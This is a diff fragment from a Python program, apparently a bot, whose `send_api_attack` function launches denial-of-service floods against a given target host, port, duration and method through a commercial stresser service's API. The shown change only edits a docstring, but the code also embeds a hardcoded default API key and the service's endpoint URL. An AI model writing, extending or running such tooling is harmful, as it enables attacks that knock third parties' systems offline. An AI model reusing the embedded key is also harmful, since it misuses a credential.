@@ -732,7 +732,7 @@ init_pseudo_owner()
 async def send_api_attack(target, port, duration, method, concurrent=2):
     """
     Send attack to API with proper parameters matching website exactly
-    API Format: /api?key=KEY&host=HOST&port=PORT&time=TIME&method=METHOD&concs=CONCS
+    API Format: /api?key=KEY&host=HOST&port=PORT&time=TIME&method=METHOD&concs=2
     """
     api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
     api_url = os.getenv("API_URL", "https://mrstresser.com/api")
